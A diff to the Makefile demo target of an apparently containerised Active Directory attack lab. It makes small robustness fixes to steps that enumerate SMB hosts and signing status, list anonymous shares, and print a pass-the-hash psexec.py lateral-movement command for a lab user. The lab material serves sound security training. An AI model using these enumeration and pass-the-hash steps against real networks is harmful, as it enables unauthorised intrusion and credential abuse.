@@ -16,10 +16,10 @@ shell:
 demo:       ## Enumerate hosts and demonstrate lateral movement
 	@echo "=== Waiting for network... ==="
 	docker compose exec attacker sh -c \
-	    'until nc -z dc01.corp.local 389 2>/dev/null; do sleep 2; done; echo "DC ready."'
+	    'until python3 -c "import socket; socket.create_connection((\"dc01.corp.local\", 389), 3)" 2>/dev/null; do sleep 2; done; echo "DC ready."'
 	@echo ""
 	@echo "=== 1. Enumerate live SMB hosts and check signing status ==="
-	docker compose exec attacker nxc smb 10.10.0.0/24 2>/dev/null \
+	docker compose exec attacker sh -c 'command -v nxc >/dev/null 2>&1 && nxc smb 10.10.0.0/24 2>/dev/null' \
 	    || docker compose exec -T attacker python3 - < demo/smb_alive.py
 	@echo ""
 	@echo "=== 2. SMB host status summary ==="
@@ -28,7 +28,7 @@ demo:       ## Enumerate hosts and demonstrate lateral movement
 	@echo "  10.10.0.102 (ws-it-01)  — signing DISABLED (lab misconfiguration)"
 	@echo ""
 	@echo "=== 3. List available shares on ws-fin-01 ==="
-	docker compose exec attacker smbclient -L 10.10.0.101 -N 2>/dev/null | grep -v "^$" || true
+	docker compose exec attacker smbclient -L 10.10.0.101 -N 2>/dev/null | grep -v "^$$" || true
 	@echo ""
 	@echo "=== Lateral movement commands to run interactively (make shell) ==="
 	@echo "  psexec.py   -hashes :HASH CORP.LOCAL/tallen@10.10.0.101"
